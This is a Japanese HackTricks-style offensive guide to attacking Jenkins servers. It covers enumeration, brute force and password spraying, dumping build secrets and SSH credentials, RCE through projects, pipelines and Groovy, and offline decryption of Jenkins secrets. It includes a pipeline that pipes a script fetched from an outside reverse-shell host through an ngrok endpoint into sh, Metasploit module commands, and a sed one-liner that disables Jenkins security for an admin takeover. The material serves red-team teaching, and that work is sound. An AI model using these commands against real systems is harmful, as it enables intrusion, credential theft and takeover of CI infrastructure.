# Jenkins セキュリティ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクション
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)や [**telegram グループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを共有する。

</details>

## 基本情報

Jenkins は、パイプラインを使用してほぼ**任意**の**プログラミング言語**とソースコードリポジトリの組み合わせに対して、**継続的インテグレーション**または**継続的デリバリー**（CI/CD）環境を確立するための簡単な方法を提供するツールです。さらに、様々な日常的な開発タスクを自動化します。Jenkins は**個々のステップのスクリプトを作成する必要性**を排除するわけではありませんが、手動で簡単に構築できるよりも、ビルド、テスト、デプロイツールの全シーケンスを統合するためのより速く、より堅牢な方法を提供します。


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 認証なしの列挙

認証なしで興味深い Jenkins ページを検索するには（例：_/people_ や _/asynchPeople_、これは現在のユーザーをリストします）、以下を使用できます：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
認証なしでコマンドを実行できるかどうかを確認します：
```
msf> use auxiliary/scanner/http/jenkins_command
```
認証情報がなくても、_**/asynchPeople/**_ パスや _**/securityRealm/user/admin/search/index?q=**_ を見ることで**ユーザーネーム**を探すことができます。

_**/oops**_ や _**/error**_ のパスからJenkinsのバージョンを取得できるかもしれません。

![](<../../.gitbook/assets/image (48).png>)

### 既知の脆弱性

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ログイン

基本情報で、Jenkinsにログインする**すべての方法**を確認できます：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 登録

アカウントを作成してログインできるJenkinsインスタンスを見つけることができます。それだけです。

### **SSO ログイン**

また、**SSO** **機能**/**プラグイン**があれば、テストアカウント（例えば、テスト用の**Github/Bitbucketアカウント**)を使用してアプリケーションに**ログイン**することを試みるべきです。[**こちら**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)からのコツです。

### ブルートフォース

**Jenkins**は**パスワードポリシー**と**ユーザーネームのブルートフォース対策**が不足しています。**弱いパスワード**や**ユーザーネームと同じパスワード**、さらには**逆順のユーザーネームをパスワード**として使用している可能性があるため、ユーザーの**ブルートフォース**が不可欠です。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### パスワードスプレー

[このPythonスクリプト](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)または[このPowerShellスクリプト](https://github.com/chryzsh/JenkinsPasswordSpray)を使用してください。

### IPホワイトリストバイパス

多くの組織では、GitHubやGitLabのような**SaaSベースのソースコントロール管理(SCM)システム**と、JenkinsやTeamCityのような**内部で自己ホストされるCI**ソリューションを組み合わせて使用しています。このセットアップにより、CIシステムは**SaaSソースコントロールベンダーからのWebhookイベントを受信**し、主にパイプラインジョブをトリガーすることができます。

これを実現するために、組織は**SCMプラットフォーム**の**IP範囲**を**ホワイトリスト**に登録し、**内部CIシステム**への**Webhook**を介したアクセスを許可しています。しかし、**誰でも**GitHubやGitLabに**アカウント**を作成し、**Webhookをトリガー**するように設定することができ、**内部CIシステム**へのリクエストを送信する可能性があることに注意が必要です。

チェック:
[https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## 内部Jenkinsの悪用

これらのシナリオでは、Jenkinsにアクセスするための有効なアカウントを持っていると仮定します。

{% hint style="warning" %}
Jenkinsに設定されている**認証**メカニズムと侵害されたユーザーの権限によっては、以下の攻撃を**実行できるかどうかが異なります。**
{% endhint %}

詳細については基本情報を確認してください:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ユーザーのリストアップ

Jenkinsにアクセスした場合、[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)で他の登録ユーザーをリストアップできます。

### ビルドのダンプで平文のシークレットを探す

ビルドコンソールの出力とビルド環境変数をダンプして、平文のシークレットを見つけることを期待して[このスクリプト](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)を使用してください。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH認証情報の盗難**

侵害されたユーザーが**新しいJenkinsノードを作成/変更する十分な権限を持っている場合**、そして他のノードにアクセスするために既にSSH認証情報が保存されている場合、彼はホストキーを検証せずに認証情報を記録するホストを設定することで**それらの認証情報を盗む**ことができます：

![](<../../.gitbook/assets/image (56).png>)

通常、JenkinsのSSH認証情報は**グローバルプロバイダー**(`/credentials/`)にありますので、他のシークレットをダンプするのと同じようにダンプすることもできます。詳細は[**シークレットのダンプセクション**](./#dumping-secrets)を参照してください。

### **JenkinsでのRCE**

**Jenkinsサーバー内でシェルを取得する**ことは、攻撃者に全ての**シークレット**と**環境変数**を漏洩させ、同じネットワーク内にある他のマシンを**攻撃する**機会を与えるか、または**クラウド認証情報を収集する**ことができます。

デフォルトでは、Jenkinsは**SYSTEMとして実行されます**。したがって、それを侵害すると攻撃者に**SYSTEM権限**を与えます。

### **プロジェクトの作成/変更によるRCE**

プロジェクトの作成/変更は、Jenkinsサーバーに対するRCEを取得する方法です：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyスクリプトの実行によるRCE**

Groovyスクリプトを実行することで、新しいプロジェクトを作成するよりも隠密にRCEを取得することもできます：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### パイプラインの作成/変更によるRCE

**パイプラインの作成/変更によってもRCEを取得できます**：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## パイプラインの悪用

パイプラインを悪用するには、依然としてJenkinsへのアクセスが必要です。

### ビルドパイプライン

**パイプライン**はプロジェクトの**ビルドメカニズムとしても使用されます**。その場合、リポジトリ内のファイルにパイプラインの構文が設定されます。デフォルトでは`/Jenkinsfile`が使用されます：

![](<../../.gitbook/assets/image (14) (1) (1).png>)

また、リポジトリ**アクセス**とパイプラインアクセスを**分離する**目的で、パイプライン設定ファイルを他の場所（例えば他のリポジトリ）に保存することも可能です。

攻撃者がそのファイルに**書き込みアクセス権を持っている場合**、それを**変更**し、Jenkinsにアクセスすることなくパイプラインを**トリガーする可能性**があります。\
攻撃者は、**ブランチ保護を回避する必要があるかもしれません**（プラットフォームとユーザー権限によっては、回避できるかもしれませんし、できないかもしれません）。

カスタムパイプラインを実行する最も一般的なトリガーは以下の通りです：

* メインブランチへの**プルリクエスト**（または他のブランチに対しても可能性があります）
* メインブランチへの**プッシュ**（または他のブランチに対しても可能性があります）
* メインブランチを**更新**し、何らかの方法で実行されるのを待つ

{% hint style="info" %}
**外部ユーザー**であれば、他のユーザー/組織のリポジトリのメインブランチに**PRを作成**してパイプラインを**トリガーする**ことは期待しないでください...しかし、もし**悪い設定**であれば、このことを悪用するだけで企業を完全に**侵害する**ことができるかもしれません。
{% endhint %}

### パイプラインRCE

前のRCEセクションでは、[**パイプラインを変更してRCEを取得する**](./#rce-creating-modifying-pipeline)技術が既に示されていました。

### 環境変数のチェック

パイプライン全体または特定のステージに対して**クリアテキストの環境変数**を宣言することができます。これらの環境変数には**機密情報を含まないべきです**が、攻撃者は常に**全てのパイプライン**の設定やJenkinsファイルをチェックすることができます。
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### シークレットのダンプ

Jenkinsが通常どのようにシークレットを扱っているかについての情報は、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

認証情報は、**グローバルプロバイダーにスコープされる** (`/credentials/`) か、**特定のプロジェクトにスコープされる** (`/job/<project-name>/configure`) ことがあります。したがって、すべてを抜き取るためには、シークレットを含む**少なくともすべてのプロジェクトを侵害し**、カスタム/毒されたパイプラインを実行する必要があります。

もう一つの問題は、パイプラインの**env内のシークレットを取得する**ためには、シークレットの**名前とタイプを知る必要がある**ことです。例えば、**`usernamePassword`** **シークレット**を**`string`** **シークレット**として**ロード**しようとすると、次のような**エラー**が発生します：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
以下は、いくつかの一般的なシークレットタイプをロードする方法です：
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
このページの最後に、**すべての資格情報タイプを見つけることができます**： [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**一度にすべてのシークレットをダンプする** 最良の方法は、**Jenkins** マシンを**侵害**することです（例えば、**ビルトインノード**でリバースシェルを実行する）その後、**マスターキー**と**暗号化されたシークレット**を**リーク**して、オフラインで復号化します。\
この方法の詳細は [ノード＆エージェントセクション](./#nodes-and-agents) と [ポストエクスプロイテーションセクション](./#post-exploitation) で説明しています。
{% endhint %}

### トリガー

[ドキュメント](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) から：`triggers` ディレクティブは、**パイプラインが再トリガーされる自動化された方法を定義します**。GitHub や BitBucket などのソースと統合されているパイプラインの場合、webhooksベースの統合が既に存在する可能性が高いため、`triggers` は必要ないかもしれません。現在利用可能なトリガーは `cron`、`pollSCM`、`upstream` です。

Cronの例：
```bash
triggers { cron('H */4 * * 1-5') }
```
**他の例はドキュメントで確認してください**。

### ノード & エージェント

**Jenkinsインスタンス**は、**異なるマシンで実行されている異なるエージェント**を持つことがあります。攻撃者の視点から、異なるマシンへのアクセスは、盗むべき**潜在的なクラウド認証情報**や、他のマシンを悪用するために乱用される可能性のある**異なるネットワークアクセス**を意味します。

詳細については基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

`/computer/`で**設定されたノード**を列挙することができます。通常、\*\*`Built-In Node` \*\*（Jenkinsを実行しているノード）と、潜在的にさらに多くのノードを見つけることができます：

![](<../../.gitbook/assets/image (25).png>)

**Built-Inノードを侵害することは特に興味深い**です。なぜなら、それは機密性の高いJenkins情報を含んでいるからです。

**ビルトインJenkinsノード**で**パイプライン**を**実行**したいことを示すために、パイプライン内で以下の設定を指定することができます：
```bash
pipeline {
agent {label 'built-in'}
```
### 完全な例

特定のエージェントでのパイプライン、cronトリガーを使用し、パイプラインとステージの環境変数を持ち、ステップで2つの変数をロードし、リバースシェルを送信します：
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## ポストエクスプロイト

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins シークレット

適切な権限があれば、`/credentials/` にアクセスしてシークレットをリストできます。これにより `credentials.xml` ファイル内のシークレットのみがリストされることに注意してくださいが、**ビルド設定ファイル**には**さらに多くのクレデンシャル**が存在する可能性があります。

各プロジェクトの**設定を見ることができれば**、リポジトリにアクセスするために使用されている**クレデンシャル（シークレット）の名前**と**プロジェクトのその他のクレデンシャル**もそこで確認できます。

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Groovy から

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ディスクから

これらのファイルが**Jenkins シークレットを復号化する**ために必要です：

* secrets/master.key
* secrets/hudson.util.Secret

このような**シークレットは通常以下で見つけることができます**：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

それらを見つけるための正規表現はこちらです：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkinsの秘密をオフラインで解読する

**秘密を解読するために必要なパスワードをダンプした場合**、[**このスクリプト**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py)を使用して**それらの秘密を解読します**。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### GroovyからJenkinsの秘密を解読する
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 新しい管理ユーザーを作成する

1. `/var/lib/jenkins/config.xml` または `C:\Program Files (x86)\Jenkis\` にある Jenkins の config.xml ファイルにアクセスします。
2. `<useSecurity>true</useSecurity>`という単語を探して、**`true`** を **`false`** に変更します。
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** サーバーを**再起動**します: `service jenkins restart`
4. 再び Jenkins ポータルにアクセスし、今回は Jenkins が資格情報を要求しないことを確認します。"**Manage Jenkins**" に移動して、**管理者パスワードを再設定**します。
5. `<useSecurity>true</useSecurity>` に設定を変更して**セキュリティを再度有効にし**、**Jenkins を再起動**します。

## 参考文献

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWS ハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式の PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFT**](https://opensea.io/collection/the-peass-family) コレクションをチェックしましょう。
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**テレグラムグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出して、あなたのハッキングのコツを**共有**してください。

</details>
